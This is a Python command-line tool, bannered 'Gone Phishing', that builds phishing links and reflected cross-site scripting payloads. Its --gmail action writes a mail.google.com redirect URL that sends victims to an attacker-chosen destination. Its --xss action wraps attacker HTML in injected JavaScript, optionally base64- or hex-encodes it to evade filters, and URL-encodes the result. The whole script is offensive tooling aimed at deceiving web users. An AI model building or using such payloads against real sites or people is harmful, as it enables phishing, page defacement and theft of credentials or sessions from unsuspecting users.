from argument_manager import parser
from argument_manager.parser import ParameterError, ActionError
import sys
import xssutils

print (""" ___   __   __ _  ____                     
 / __) /  \ (  ( \(  __)                    
( (_ \(  O )/    / ) _)                     
 \___/ \__/ \_)__)(____)                    
 ____  _  _  __  ____  _  _  __  __ _   ___ 
(  _ \/ )( \(  )/ ___)/ )( \(  )(  ( \ / __)
 ) __/) __ ( )( \___ \) __ ( )( /    /( (_ \\
(__)  \_)(_/(__)(____/\_)(_/(__)\_)__) \___/

""")


def gmail_redirect(values):
    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" %  xssutils.url_encode_all_chars(values.get_dest()))

def encode_xss(values):
    html = values.get_html();
    if html[0] == '@':
        html = xssutils.read_file(html[1:])
    html = xssutils.minify_html(html)
    encoders = values.get_encoders(False)
    if(encoders is not False):
        for i in encoders.split(','):
            if i.lower() == 'b64':
                html = xssutils.base64_encode_string(html)
            if i.lower() == 'hex':
                html = xssutils.js_hex_encode_all_chars(html)
    js = values.get_js('%s')
    # @todo: base64 and empty js what to do?
    print(xssutils.url_encode_all_chars(js % html))

argManager = parser.get_manager()\
    .add_value('--dest', metavar='Destination URL (for gmail)', nargs=1)\
    .add_value('--html', metavar='html to use, prefix with @ to make it a file e.g. --html @file.html', nargs=1)\
    .add_value('--encoders', metavar="encoder/comma delimited list of encoders, each will be applied sequentially: supported b64, hex", nargs=1, )\
    .add_value('--js', metavar="Javascript to inject html into (optional), use %s to show location to inject e.g. 'document.body.innerHTML=atob(\"%s\")", nargs=1)

argManager.add_action(argManager.print_help, '--help', help='Show this message', action='store_true')\
    .add_action(gmail_redirect, '--gmail', help='Redirect vial mail.google.com', action='store_true')\
    .add_action(encode_xss, '--xss', help="Create reflected xss string", action="store_true")

try:
    if len(sys.argv) > 1:
        argManager.exec()
    else:
        argManager.print_help()

except (ParameterError) as e:
    if argManager.get_current_action() is None:
        print('Input parameter Error: "%s"' % e)
    else :
        if e is not None:
            print('Input parameter Error: "%s" while executing the following command: ' % e , argManager.get_current_action())
    exit(1)

except ActionError as e:
    print("Action Error: " +  str(e))
